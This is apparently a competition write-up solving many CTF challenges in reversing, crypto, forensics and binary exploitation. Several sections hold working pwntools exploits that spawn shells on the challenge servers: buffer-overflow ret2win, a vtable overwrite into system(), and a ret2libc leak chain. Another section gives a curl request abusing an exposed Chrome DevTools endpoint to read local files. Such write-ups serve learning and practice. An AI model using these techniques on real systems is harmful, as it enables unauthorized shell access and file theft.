# my_way

We are given a go binary, which by the strings seems to encrypt a message and display it.
By reversing the binary, we find out that it uses AES-CBC encryption.
By analyzing it more, we see that the key used for AES seems to be a concatenation of the values (as strings) in the fibonacci sequence.
```C
   while ( v16 > v33 )
    {
      v58 = v33;
      v37 = v15[v33];
      if ( v37 )
      {
        v55 = v34;
        v62 = v35;
        v38 = v37->abs.len;
        neg = v37->neg;
        v40 = math_big_nat_itoa(
                v37->abs.ptr,
                v38,
                v37->abs.cap,
                neg,
                10,
                v16,
                (_DWORD)v37,
                v13,
                (_DWORD)v14,
                v47,
                v49,
                v51,
                v53,
                v54);
        v41 = v38;
        LODWORD(v38) = v40;
        v46 = runtime_slicebytetostring(0, v40, v41, neg, 10, v42, v43, v44, v45, v48, v50, v52);
        v34 = v55;
        LODWORD(a5) = v38;
        LODWORD(len) = v46;
        v35 = v62;
      }
      else
      {
        LODWORD(a5) = 5;
        len = (__int64)"<nil>";
      }
      v36 = runtime_concatstring2(
              0,
              v35,
              v34,
              len,
              (_DWORD)a5,
              v16,
              (_DWORD)v37,
              v13,
              (_DWORD)v14,
              v47,
              v49,
              v51,
              v53,
              v54);
      v16 = a1;
      v34 = v35;
      v35 = v36;
      v33 = v58 + 1;
      v15 = v64;
    }
```
Since the key is expected to be 16 bytes, we can already obtain the key.
```asm
.text:000000000049C940                 cmp     rcx, 10h
.text:000000000049C944                 jb      loc_49CAD7
.text:000000000049C94A                 mov     ebx, 10h
.text:000000000049C94F                 mov     rdi, [rsp+0F0h+var_98]
.text:000000000049C954                 mov     rsi, [rsp+0F0h+var_B8]
.text:000000000049C959                 mov     r8, [rsp+0F0h+var_B0]
.text:000000000049C95E                 xchg    ax, ax
.text:000000000049C960                 call    main_encryptMessage
```
Next step would be the IV. By analyzing the code for the encryption, we can see that it uses the key as the IV as well, so we can now decrypt the given message.

```Python
from Crypto.Cipher import AES
def build_fibo():
	f = [0, 1]
	for i in range(2, 32, 1):
		f.append(f[i - 1] + f[i - 2])
	return f

f = build_fibo()
concat = ''.join([str(x) for x in f])[:16]
key = IV = concat.encode()
data = bytes.fromhex("6aa1ffb194e5383c6dcf7d7473be5738bc24156b3c90a30a561b1683f97f8798fe1817a888078b8a94e617fd09aaf908")
aes = AES.new(key, AES.MODE_CBC, IV)
print(aes.decrypt(data).decode())
```

Flag: `ACS_KEYSIGHT_CTF{make_it_happen}`

# EZ32

We are given a simple binary which just seems to have a buffer overflow:
```C
void FUN_080491bf(void)

{
  undefined1 local_4c [72];
  
  printf("Enter some input: ");
  read(0,local_4c,0x80);
  puts("Welcome!");
  return;
}
```

Looking a bit more through it, we see that we have a `win` function, which calls `system("/bin/sh");`. Analyzing the security options of the file, we see that it has no PIE, thus all addresses are static and we can easily do our ret2win.
```Python
from pwn import *

context.binary = elf = ELF("./ez", checksec=False)
win_sym = p32(0x080491a6)

gdb_script = """
b *0x080491bf
c
"""
#p = gdb.debug(elf.path, gdbscript=gdb_script)

p = remote("ctf-03.security.cs.pub.ro", 31900)

payload = b"A" * 76 + win_sym
p.sendline(payload)
p.interactive()
```

Flag: `ACS_KEYSIGHT_CTF{warming_up}`

# Double-Trouble

We are given a binary with a double-free vulnerability:
```C
void FUN_00400a7d(void)
{
  setvbuf(stdout,(char *)0x0,2,0);
  DAT_006020e8 = malloc(0x1e);
  DAT_006020d8 = malloc(0x1e);
  _DAT_006020e0 = malloc(0x1e);
  free(DAT_006020e8);
  free(DAT_006020d8);
  free(DAT_006020e8);
  return;
}
```

Then, in the main function, it then reallocates buffers with the same length:
```C
undefined8 FUN_00400c67(void)

{
  int iVar1;
  uint local_24;
  char *local_20;
  char *local_18;
  char *local_10;
  
  FUN_00400a7d();
  local_20 = (char *)malloc(0x1e);
  local_18 = (char *)malloc(0x1e);
  local_10 = (char *)malloc(0x1e);
  FUN_00400b01(local_20);
  printf("Give me your name: ");
  fgets(local_18,0x1d,stdin);
  printf("How much do you want to write? ");
  __isoc99_scanf(&DAT_00400eb8,&local_24);
  getchar();
  if (0x1f < local_24) {
    puts("Nice try...");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  puts("Tell me a story...");
  fgets(local_10,local_24,stdin);
  puts(local_10);
  iVar1 = strncmp(local_20,"gotme",5);
  if (iVar1 != 0) {
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  puts("Almost there");
  FUN_00400b99();
  puts("Bye");
  return 0;
}
```

Because of that double-free, the tcache free chuncks linked-list contains two references of the same chunk. It will be something like: `HEAD->DAT_006020e8->DAT_006020d8->DAT_006020e8`. Then, when we reallocate buffers with the same length, it takes them from free chunks list, and thus `local_20` will point to `DAT_006020e8`, then `local_18` to `DAT_006020d8` and `local_10` to `DAT_006020e8`, which is the same as `local_20`. Hence, `local_20` and `local_10` point to the same memory address.

The program loads a password from the server into `local_20`. To pass the first check, we need to make sure that the first 5 bytes of that password equal `gotme`, and for the second check, it reads the password again and ensure we got it fully. Thus, we need to find a way to leak the password.
However, since `local_10` and `local_20` point to the same memory address, if we give it a story of 0 bytes, it won't write anything into `local_20` and the `puts(local_10)` will actually print the password. Doing that, we get that the password is `master-chief`. Now, rerun the binary again, and this time give the story `gotme`, since it will write into `local_10` (and since they're the same, into `local_20` as well) and we'll pass the first check. For the second check, give it the obtained password.

Flag: `ACS_KEYSIGHT_CTF{I_need_a_weapon}`

# Beep

We are given some encrypted data, and told that it is encrypted with a block cipher.
By analyzing it, we can see that there are only 3 patterns that repeat. Since we know this is encrypted using a block cipher and we have repeating ciphertext all throught, it is safe to assume that AES ECB was used, and we'd have to match the ciphertexts to known plaintexts based on analysis. Given that the challenge's name is `Beep`, I assumed that each block would be a character in more code. By trying all combinations of mapping out, we eventually reach one which gives us the flag.

```Python
from collections import Counter

with open("encrypted.bin", "rb") as f:
	ciphertext = f.read()
block_size = 16
blocks = [ciphertext[i:i+block_size] for i in range(0, len(ciphertext), block_size)]
counts = Counter(blocks)
maps = {}
i = 0
for block, count in counts.items():
	if i == 0:
		maps[block] = "-"
	elif i == 1:
		maps[block] = " "
	elif i == 2:
		maps[block] = "."
	i += 1
res = ""
for block in blocks:
	res += maps[block]
print(res)
```

Correct morse code: `--- --- --- --- ....   .- .-. . -. -   .-- .   ... -. . .- .- .- .- -.- -.--   - .... .   ..-. .-.. .- --.   .. ...   .- -.-. ...   .. -..- .. .-   -.-. - ..-.   -... . . -.. . -... . -.. .- -... -... .. -.. -.-- -... --- --- -.. .. -... -.-- -.. --- ---`

Flag: `ACS_IXIA_CTF{BEEDEBEDABBIDYBOODIBYDOO}`

# A Quiet Place

Analyzing the binary, we see that its main function is just a big bunch of `syscall` instructions with odd SSNs, making no specific sense.
```C
  syscall(3,0,0,0,0,0);
  syscall(1,0,0,0,0,0);
  syscall(4,0,0,0,0,0);
  syscall(1,0,0,0,0,0);
  syscall(5,0,0,0,0,0);
  syscall(9,0,0,0,0,0);
  syscall(2,0,0,0,0,0);
  syscall(6,0,0,0,0,0);
  syscall(5,0,0,0,0,0);
  syscall(3,0,0,0,0,0);
  syscall(5,0,0,0,0,0);
  syscall(8,0,0,0,0,0);
  syscall(9,0,0,0,0,0);
  syscall(7,0,0,0,0,0);
  syscall(9,0,0,0,0,0);
  syscall(3,0,0,0,0,0);
  syscall(2,0,0,0,0,0);
  syscall(3,0,0,0,0,0);
  syscall(8,0,0,0,0,0);
  syscall(4,0,0,0,0,0);
  syscall(6,0,0,0,0,0);
  sleep(1);
  syscall(2,0,0,0,0,0);
  syscall(7,0,0,0,0,0);
  syscall(1,0,0,0,0,0);
  syscall(8,0,0,0,0,0);
  syscall(2,0,0,0,0,0);
  syscall(8,0,0,0,0,0);
  syscall(1,0,0,0,0,0);
  syscall(8,0,0,0,0,0);
  syscall(2,0,0,0,0,0);
  syscall(8,0,0,0,0,0);
  syscall(4,0,0,0,0,0);
  syscall(5,0,0,0,0,0);
  syscall(9,0,0,0,0,0);
  syscall(0,0,0,0,0,0);
  syscall(4,0,0,0,0,0);
  syscall(5,0,0,0,0,0);
  syscall(2,0,0,0,0,0);
  syscall(3,0,0,0,0,0);
  syscall(5,0,0,0,0,0);
  syscall(3,0,0,0,0,0);
  syscall(6,0,0,0,0,0);
  sleep(1);
  syscall(1,0,0,0,0,0);
  syscall(6,0,0,0,0,0);
  syscall(1,0,0,0,0,0);
  syscall(8,0,0,0,0,0);
  syscall(0,0,0,0,0,0);
  syscall(3,0,0,0,0,0);
  syscall(3,0,0,0,0,0);
  syscall(9,0,0,0,0,0);
  syscall(8,0,0,0,0,0);
  syscall(8,0,0,0,0,0);
  syscall(7,0,0,0,0,0);
  syscall(4,0,0,0,0,0);
  syscall(9,0,0,0,0,0);
  syscall(8,0,0,0,0,0);
  syscall(9,0,0,0,0,0);
  syscall(4,0,0,0,0,0);
  syscall(8,0,0,0,0,0);
  syscall(4,0,0,0,0,0);
  syscall(8,0,0,0,0,0);
  syscall(2,0,0,0,0,0);
  syscall(0,0,0,0,0,0);
  sleep(1);
```

We see that these calls are split by some `sleep` instructions, thus creating three groups of syscalls.
Analyzing the first group by getting their SSNs, we get `3,1,4,1,5,9,2,6,5,3,5,8,9,7,9,3,2,3,8,4,6`, which resembles the digits of `π`.
For the second group, we get `2,7,1,8,2,8,1,8,2,8,4,5,9,0,4,5,2,3,5,3,6`, which are digits of `e` (base for `ln` - natural log).
Lastly, for the third group we get `1,6,1,8,0,3,3,9,8,8,7,4,9,8,9,4,8,4,8,2,0`, which seems to be some of the digits of `φ` (the golden ration, positive solution for `x^2 - x - 1 = 0`). Putting them together yields the flag.

Flag: `ACS_KEYSIGHT_CTF{pi_e_phi}`

# Class War

We are given a binary, and some oddly formatted pieces of the source code, which doesn't provide much additional stuff that Ghidra/IDA were already giving.

```C
undefined8 main(void) 

{ 
  int iVar1; 
  long in_FS_OFFSET; 
  undefined **local_60; 
  char local_58 [72]; 
  long local_10; 

  local_10 = *(long *)(in_FS_OFFSET + 0x28); 
  setvbuf((FILE *)stdout,(char *)0x0,2,0); 
  local_60 = &PTR_sayHello_00482060; 
  printf("Do you want to continue? "); 
  doNothing(); 
  fgets((char *)&local_60,0x40,(FILE *)stdin); 
  iVar1 = strncmp(local_58,"yes",3); 
  if (iVar1 == 0) { 
    greet(&local_60); 
  } 
  if (local_10 != *(long )(in_FS_OFFSET + 0x28)) { 
                    /* WARNING: Subroutine does not return */ 
    __stack_chk_fail(); 
  } 
  return 0; 
}
void doNothing(void) 

{ 
  long in_FS_OFFSET; 
  Executor local_18 [8]; 
  long local_10; 

  local_10 = *(long *)(in_FS_OFFSET + 0x28); 
  Executor::Executor(local_18); 
  if (local_10 != *(long )(in_FS_OFFSET + 0x28)) { 
                    /* WARNING: Subroutine does not return */ 
    __stack_chk_fail(); 
  } 
  return; 
} 
void __thiscall Executor::Executor(Executor *this) 

{ 
  (undefined **)this = &PTR_execute_00482078; 
  puts(""); 
  return; 
}
void __thiscall Executor::execute(undefined8 param_1_00,char *param_2) 

{ 
  system(param_2); 
  return; 
}
void __cdecl greet(undefined8 *param_1) 

{ 
  size_t sVar1; 
  long in_FS_OFFSET; 
  undefined8 local_80; 
  char local_78 [104]; 
  long local_10; 

  local_10 = *(long *)(in_FS_OFFSET + 0x28); 
  local_80 = param_1; 
  printf("What is your name? "); 
  fgets(local_78,100,(FILE )stdin); 
  sVar1 = strlen(local_78); 
  local_78[sVar1 - 1] = '\0'; 
  ((code )local_80)(local_80,local_78); 
  if (local_10 != *(long )(in_FS_OFFSET + 0x28)) { 
                    /* WARNING: Subroutine does not return */ 
    __stack_chk_fail(); 
  } 
  return; 
} 
```

Analyzing the main function, we can see that it gets a pointer to the `vtable` for the `SayHello` class and stores it in `local_60`. With that `fgets` call, it allows us to overwrite the saved `vtable` with our own value. By digging through the other functions, we also see that there is an `Executor` class, which has a function `execute`, which just runs `system` on whatever we give it. Looking at the `greet` function, we see that it takes in a pointer and then calls that pointer (pointer supposed to be the `vtable` for `SayHello`). Since we can overwrite `local_60`, we can write the `vtable` for `Executor` (since PIE is disabled). Additionally, we'll have to pass a check, namely that `local_58` is `yes`. Since `local_60` is at `rbp - 0x60`, and `local_58` starts at `rbp - 0x58`, adding a `yes` after our payload will do the trick.

Exploiting this vulnerability, we are effectively able to run system commands, by giving them as answer to the prompt `What is your name? ` in `greet`, since greet will now use the `vtable` for `Executor` and call `execute` on our argument. Fiddling around a bit to find the flag, we find it is in `/home/ctf/flag`.

```Python
from pwn import *

context.binary = elf = ELF("./class-war", checksec=False)

gdb_script = """
b main
c
"""
#p = gdb.debug(elf.path, gdbscript=gdb_script)
p = remote('ctf-03.security.cs.pub.ro', 32334)
execute = p64(0x00482078)
p.sendline(execute + b"yes")
p.interactive()
``` 

Flag: `ACS_KEYSIGHT_CTF{The_wise_avoid_the_battle}`

# Elven Godmother

Analyzing the binary, we see a pretty normal main function.
```C

/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined4 main(undefined4 param_1,undefined4 *param_2)

{
  size_t sVar1;
  int iVar2;
  char local_244 [15];
  char acStack_235 [256];
  char acStack_135 [257];
  undefined1 local_34 [32];
  char *local_14;
  char *local_10;
  char local_9;
  
  setvbuf(_stdout,(char *)0x0,2,0);
  puts("Find out your elven name and improve your love life considerably!\n");
  printf("What is your first name? ");
  fgets(acStack_135 + 1,0x100,_stdin);
  sVar1 = strlen(acStack_135 + 1);
  acStack_135[sVar1] = '\0';
  printf("What is your last name? ");
  fgets(acStack_235 + 1,0x100,_stdin);
  sVar1 = strlen(acStack_235 + 1);
  acStack_235[sVar1] = '\0';
  printf("What is your gender? (m/f) ");
  fgets(local_244,0x10,_stdin);
  sVar1 = strlen(local_244);
  acStack_235[sVar1 - 0x10] = '\0';
  iVar2 = strcmp(local_244,"m");
  if (iVar2 == 0) {
    local_9 = '\x01';
  }
  else {
    iVar2 = strcmp(local_244,"f");
    if (iVar2 != 0) {
      usage(*param_2);
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    local_9 = '\x02';
  }
  mix_names(acStack_135 + 1,acStack_235 + 1,local_34,0x20);
  local_10 = (char *)get_first_name((int)local_34,0x20,local_9);
  local_14 = (char *)get_surname((int)local_34,0x20);
  printf("\nYour elven name is %s %s\n",local_10,local_14);
  return 0;
}
```
It reads a name (first + last) and gender, and then sends them to other functions. Both names are 0x100 bytes array, and the gender has only 1 byte. There is some add zeroing for the gender, but we won't inspect that for now.

Looking into `mix_names`, we can see some interesting stuff:
```C

/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */

void mix_names(char *param_1,char *param_2,void *param_3,size_t param_4)

{
  size_t sVar1;
  size_t sVar2;
  char local_114 [256];
  uint local_14;
  uint local_10;
  
  strcpy(local_114,param_1);
  strcat(local_114,param_2);
  memset(param_3,0,param_4);
  local_10 = 0;
  while( true ) {
    sVar1 = strlen(param_1);
    sVar2 = strlen(param_2);
    if ((sVar2 + sVar1 & 0xff) <= local_10) break;
    local_14 = (uint)*(char *)((int)param_3 + (local_10 & 0x1f));
    local_14 = local_14 + (int)local_114[local_10];
    *(char *)((local_10 & 0x1f) + (int)param_3) =
         (char)local_14 + (char)(local_14 / 0x1a) * -0x1a + 'a';
    local_10 = local_10 + 1;
  }
  return;
}
```

We see that it concatenates our 0x100 buffers, thus overwriting the stack on this function and allowing for a buffer overflow.

After fiddling a bit with the offsets, we notice that we can only write 3 dwords (since the binary is 32 bits) (including saved `RIP`), because we'll run into the saved buffer which is used in `memset` and we'll crash, so we have to figure out how to proceed.

Analyzing the binary further reveals not much else, thus we focus on our buffer overflow. Since we have no PIE and no `win` function, and we are on 32 bits, this seems to be a `ret2libc` scenario, hence we'll need to trigger a leak to get the base, then execute `system("/bin/sh")`.

Looking at what functions we could use for leakage, we find we have a `printf` in our binary. Trying to move execution to `printf@PLT("%x\0", printf@GOT)` fails since `fgets` stops at 0 and it messes up the chain. However, we can use an already existing format string for that, namely the one at the end of main to do our printing. Doing that, we have successfully gotten a libc leak for `printf`. Since we can only write 3 dwords, and we use a predefined format string, we cannot control the execution further and the program crashes here. Luckily, if we run the exploit more times, we observe that the libc base is constant, thus we can split our exploit into two parts. Get the libc leak and crash the application, then start again and use the leaked address to execute system. Doing this and ensuring proper stack alignment (added a dummy address from main just to be safe) yields the flag.


```Python
from pwn import *

context.binary = elf = ELF("./elven_godmother", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
gdb_script = """
b main
b mix_names
b *0x08048760
c
"""
#p = gdb.debug(elf.path, gdbscript=gdb_script)
# first part - leak libc
p = remote('ctf-03.security.cs.pub.ro', 31920)
p.sendline(b"A" * 252)
p.sendline(b"B" * 24 + p32(elf.plt["printf"]) + p32(0x0804b2be) + p32(elf.got["printf"]))
p.sendline(b"m")
print(p.recvline())
print(p.recvline())
l = p.recvline()
l = l.split(b"(m/f) ")[1][:4]
val = int.from_bytes(l, "little")
libc_base = val - libc.sym["printf"]
print("libc_base: " + hex(libc_base))
p.close() # close because of crash after leak

# second part
p = remote('ctf-03.security.cs.pub.ro', 31920)
system_addr = libc_base + libc.sym["system"]
binsh_addr = libc_base + next(libc.search(b"/bin/sh\x00"))
print("system_addr: " + hex(system_addr))
print("libc_addr: " + hex(binsh_addr))
p.sendline(b"A" * 252)
p.sendline(b"B" * 24 + p32(system_addr) + p32(0x080488d7) + p32(binsh_addr))
p.sendline(b"m")
p.interactive()

```

Flag: `ACS_KEYSIGHT_CTF{Tenna_ento_lye_omenta}`

# Filter the flag

We are given a HTTP response from something, with some binary data.
```
HTTP/1.1 200 OK
Date: Sun, 10 Apr 2019 23:26:07 GMT
Server: Apache/2.2.8 (Ubuntu) mod_ssl/2.2.8 OpenSSL/0.9.8g
Last-Modified: Sun, 24 Mar 2019 22:04:35 GMT
ETag: "45b6-834-49130cc1182c0"
Accept-Ranges: bytes
Content-Length: 12
Connection: close
Content-Type: text/html

BZh91AY&SY{je¡��€l�) @…EŠ �1FŒ£L¦¦ŒšÎ1d“žfœ–ÀU€•—],z¬‹¹"œ(H=µ2Ð€
```

The header in that data `BZh` is the header for compressed data using `Bzip2`. Decompressing that data yields the flag.

Flag: `ACS_IXIA_CTF{th1s_1s_4_w3ll_h1dd3n_1nf0}`

# Racoon

We are given a .gz archive. Extracting it, we see a big 8MB file, with mostly 0s. Getting the strings for it, we see barely any ascii text, out of which 3 are common words (`banner`, `tavern`, `Snotspill`), and the other one is the OpenSSL prefix salted encrypted data (`Salted__`).
Getting that data
```
53 61 6C 74 65 64 5F 5F 00 6F D8 4D E4 7E EB E5 A7 78 BA 5B 63 D0 D6 F8 34 FB 5E D5 0A D2 E2 15 9B 45 D0 04 BD F9 0E 22 04 3F 3E 12 0C CF D0 88 C4 1A DF D9 95 93 77 FF 7A 26 D9 A8 50 9E 70 59
```
and trying to decrypt it using OpenSSL and one of the found words (just try them all) as a password yields the flag.

```
openssl enc -d -aes-256-cbc -in enc.bin -out decr.txt -k Snotspill
```
Flag: `ACS_KEYSIGHT_CTF{you_kill_uglies_get_banner}`

# Two Deadly Elusive Sorceresses

We are given a binary file for this. Analyzing it, we see it builds some strings and just prints them out, and nothing more. So, jumping in with strings, we see 5 base64 strings, which decode to this:
```
Cast a spell and break the encryption: BuM8FjDNduZQ0AUwopdHzgzlhTv4nqAGatMg/Sot4suI7BNVlUxLTts6NYwNlXyykHEkf2KmyNs=
Hint 1 encryption: 411w8UlTaz0EbWpzB2ktABCQc/DHWQ5Aosnd2LxxcQ0=
Hint 2 encryption: q57whMxGC0shO3zqjCFnaRaSdYsjLp9RZmgyYJ3CCx3Q3eomor47Uw==
ECB mode, keys zero until last 16 bits:)
Examine the task name carefully!
```
Analyzing the hints given, it says `ECB mode` and `keys`, which prompt us to think about `2DES` or `3DES`. We also get another hint, that the keys are all 0s until the last 16 bits. Given that bruteforcing 6 bytes (2 related with the other 2 related with the other 2) is quite big and wouldn't really fit in the CTF's timeframe, I decided to give `2DES` a try first, and see from there if it would fail.

Still, trying to brute 4 bytes (2 by 2 related) would take some time, so, one approach to make the running time better would be a meet-in-the-middle attack, and since we know how the flag starts, it seems that this should work.

Since `2DES-ECB` means `E_K2(E_K1(P))`, we can precompute all values for `M = E_K1(P)` with our known block, and then do `D_K2(M)` and see if we have a matching block in our dictionary. If there is a match, it means we found our two candidates for the keys, and can go and decrypt the entire flag.
Happily, this approach yields the flag. (I went directly and tried it on the flag, but apparently the hints decrypt to what we already know in plaintext, so that's that)

```Python
from base64 import b64decode
from Crypto.Cipher import DES
from Crypto.Cipher import DES3

plaintext_block = b'ACS_IXIA'
ciphertext = b64decode("BuM8FjDNduZQ0AUwopdHzgzlhTv4nqAGatMg/Sot4suI7BNVlUxLTts6NYwNlXyykHEkf2KmyNs=")

mid_dict = {}
for candidate1 in range(2**16):
	key_1 = b'\x00' * 6 + candidate1.to_bytes(2, 'big')
	cipher1 = DES.new(key_1, DES.MODE_ECB)
	mid = cipher1.encrypt(plaintext_block)
	mid_dict[mid] = candidate1


for candidate2 in range(2**16):
	key_2 = b'\x00' * 6 + candidate2.to_bytes(2, 'big')
	cipher2 = DES.new(key_2, DES.MODE_ECB)
	mid_candidate = cipher2.decrypt(ciphertext[:8])
	if mid_candidate in mid_dict:
		print("Candidate keys found!")
		print("K1 candidate:", candidate1 := mid_dict[mid_candidate])
		print("K2 candidate:", candidate2)
		key_1 = b'\x00' * 6 + candidate1.to_bytes(2, 'big')
		plaintext = b""
		for i in range(0, len(ciphertext), 8):
			block = ciphertext[i:i+8]
			intermediate = DES.new(key_2, DES.MODE_ECB).decrypt(block)
			pt_block = DES.new(key_1, DES.MODE_ECB).decrypt(intermediate)
			plaintext += pt_block

		print("Flag:", plaintext)
		break
```
```
K1 candidate: 17917
K2 candidate: 24774
```
Flag: `ACS_IXIA_CTF{F0r_Th0s3_Ab0ut_T0_R0ck_W3_Salut3_Y0u!!!!!}`

# Damn Not Safe

We are given a PCAP with a lot of `ARP` requests, named `dns.pcap`. We filter for `DNS` to remove the noise from `ARP`, and the flag appears in the data of the request packets.

Flag: `ACS_KEYSIGHT_CTF{_Make_DNS_Great_Again_}`

# EZ64

After some time, the challenge got fixed :D

Its very similar to the `EZ32` challenge, its the same setup, but now we're on 64 bits, so we'll have to align the stack properly for `system("/bin/sh")`. For that I used a simple ret to force stack alignment.

```Python
from pwn import *

context.binary = elf = ELF("./ez", checksec=False)

gdb_script = """
b *0x004011cb
c
"""
#p = gdb.debug(elf.path, gdbscript=gdb_script)
p = remote("ctf-03.security.cs.pub.ro", 31910)
gadg = p64(0x000000000040101a) # ret gadget for alignment
p.send(b"A" * 72 + gadg +  p64(0x004011b6))
p.interactive()

```

Flag: `ACS_KEYSIGHT_CTF{cold_is_the_void}`

# Follow the protocol

We are given a website, and are told that this challenge uses Chrome DevTools protocol, meaning that we should be able to use DevTools to debug the page/connect via WebSockets and browse the browser that's being remotely debugged. After some small research, I ended up finding this webpage with all the possible endpoints for devtools ([https://chromedevtools.github.io/devtools-protocol/#endpoints]), and I did `GET /json`, and it printed out a lot of internal endpoints, out of which one struck interest:
```
[{"description":"","devtoolsFrontendUrl":"/devtools/inspector.html?ws=127.0.0.1:9222/devtools/page/DF85D9A89F089334EA4AC172CB2D336B","id":"DF85D9A89F089334EA4AC172CB2D336B","title":"passwd","type":"page","url":"file:///etc/passwd","webSocketDebuggerUrl":"ws://127.0.0.1:9222/devtools/page/DF85D9A89F089334EA4AC172CB2D336B"},{"description":"","devtoolsFrontendUrl":"/devtools/inspector.html?ws=127.0.0.1:9222/devtools/page/DD4766821F63808666AB4CDFD9BABD3C","id":"DD4766821F63808666AB4CDFD9BABD3C","title":"","type":"page","url":"file://x/","webSocketDebuggerUrl":"ws://127.0.0.1:9222/devtools/page/DD4766821F63808666AB4CDFD9BABD3C"},{"description":"","devtoolsFrontendUrl":"/devtools/inspector.html?ws=127.0.0.1:9222/devtools/page/C721ED7FF33177B3E0CB1954F9D17B37","id":"C721ED7FF33177B3E0CB1954F9D17B37","title":"passwd","type":"page","url":"file:///etc/passwd","webSocketDebuggerUrl":"ws://127.0.0.1:9222/devtools/page/C721ED7FF33177B3E0CB1954F9D17B37"},{"description":"","devtoolsFrontendUrl":"/devtools/inspector.html?ws=127.0.0.1:9222/devtools/page/B44CED4435C08C80D9A69D9CE191F7BF","id":"B44CED4435C08C80D9A69D9CE191F7BF","title":"flag.txt","type":"page","url":"file:///home/ctf/flag.txt","webSocketDebuggerUrl":"ws://127.0.0.1:9222/devtools/page/B44CED4435C08C80D9A69D9CE191F7BF"},{"description":"","devtoolsFrontendUrl":"/devtools/inspector.html?ws=127.0.0.1:9222/devtools/page/29838D0D551ED24A341F1913C8E2F295","id":"29838D0D551ED24A341F1913C8E2F295","title":"flag.txt","type":"page","url":"file:///flag.txt","webSocketDebuggerUrl":"ws://127.0.0.1:9222/devtools/page/29838D0D551ED24A341F1913C8E2F295"}]
```

Looking more through that endpoints page, we see a `PUT` endpoint for getting the data from an internal page via websockets. So, running `curl -X PUT "http://vmx.cs.pub.ro:8899/json/new?ws://127.0.0.1:9222/devtools/page/B44CED4435C08C80D9A69D9CE191F7BF"`, yields the flag.

Flag: `ACS_KEYSIGHT_CTF{screeshot_like_there_is_no_tomorrow}`

# Oracle

Not going to lie, this was a bit of a journey. So, we have received the hint that it is a networkin/communication-related protocol and I started digging. Using something simple as 7 bit/8bit decoding + rotates/shifts wasn't working.
I quickly stumbled upon Manchester encoding, which was somewhat fitting, but didn't work in our case.
After a pause and some more research, I learned about differential manchester encoding, and this seems to be working. However, since there are multiple versions (no transition = 0, transition = 1/no tranisition = 1, transition = 0) ([https://en.wikipedia.org/wiki/Differential_Manchester_encoding]), I tried them both and the one with transition = 1 worked.

```Python
import binascii
ct = "1010011001100101101001100110101001011010011010100101101010101010010110010110101001011001101001011010010101100101101001011001010110100110100110100101100110101010010110010110011001011010010110011010010101010101101001100110101001011010010110011010011001010110010101010110101001011001010110100101011001100101101010010101101001010101101001011010100110010101101010010110010110101010010110100101011010100101101001010101010110100101100101100101011010101010010101101010010110101001100110100101011010101001101001010101010110101001101010011010100101010101101010100110100110101010010110011010101010100101"

res = ""
prevhalf = ct[0]
for i in range(0, len(ct), 2):
  pair = ct[i] + ct[i + 1]
  trans = prevhalf != ct[i]
  res += "1" if trans else "0"
  prevhalf = ct[i + 1]

print(binascii.unhexlify("%x" % int(res, 2)))

```

Flag: `ACS_KEYSIGHT_CTF{Mamucium_Roman_fort}`
